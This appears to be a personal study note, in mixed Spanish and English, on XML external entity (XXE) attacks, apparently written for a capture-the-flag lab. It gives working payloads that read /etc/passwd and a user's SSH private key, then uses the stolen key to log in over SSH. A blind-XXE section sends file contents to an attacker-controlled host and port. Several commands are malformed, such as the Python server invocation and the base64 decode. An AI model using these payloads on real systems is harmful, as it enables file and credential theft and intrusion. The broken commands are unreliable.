
Traducción del inglés-El ataque de entidad externa XML, o simplemente ataque XXE, es un tipo de ataque contra una aplicación que analiza la entrada XML. Este ataque ocurre cuando la entrada XML que contiene una referencia a una entidad externa es procesada por un analizador XML mal configurado. [Wikipedia (Inglés)](https://en.wikipedia.org/wiki/XML_external_entity_attack)


So when we can put an atchive xml on some website or we can see on a web petition something on XML we must abuse of the !ENTITY  (is like a variable)

```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd">] >
<elements>
<Author>&xxe;</Author>
<Subject>Peperoni</Subject>
<Content>This is the content</Content>
</elements>
```
you can put (replace, foo or investigate another ones) 


We can now see if we can watch the private key of this user
```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">] >
<elements>
<Author>&xxe;</Author>
<Subject>Peperoni</Subject>
<Content>This is the content</Content>
</elements>
```

now that we have the key we save it on a file called "id_rsa"

chmod 600 id_rsa  
and now

We use the file as identity file to connect to that machine.
```
ssh -i id_rsa user@10.10.10.91
```


# BLIND XXE #

Same idea but we need an external entity if we want to see the content.


And in our pc or server we must put another this if we want to see the content of the petitions that we made.



Hacemos dos , una es para leer el archivo y la otra es para enviarla aparentemente al servidor en mi maquina o donde sea que recibo la peticion para interpretarla.. la primera aparentemente recibe el archivo en base 64 y la otra lo envia a ese servidor.. creo

creo dos entidades, una se llama poc  y la otra xxe
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % poc "<!ENTITY &#37; xxe SYSTEM 'http://172.16.0.1:4444/value=?%file;'>">
```

Ok now we listen with python.
```
python3  http.server 80
```


We must put something like this on the victims environment... call the two entitys
```
<?xml_version="1.0" encoding="utf-8">
<!DOCTYPE XXE [<!ENTITY % remote SYSTEM "http://172.16.0.1:4444/data.xml"> 
%remote;
%poc;
xxe;
]>
```


Now we recive the etc passwd on our server  in base64 ... to decode lets use 

```
echo "textonbase64" | -d base64 ; echo 
```

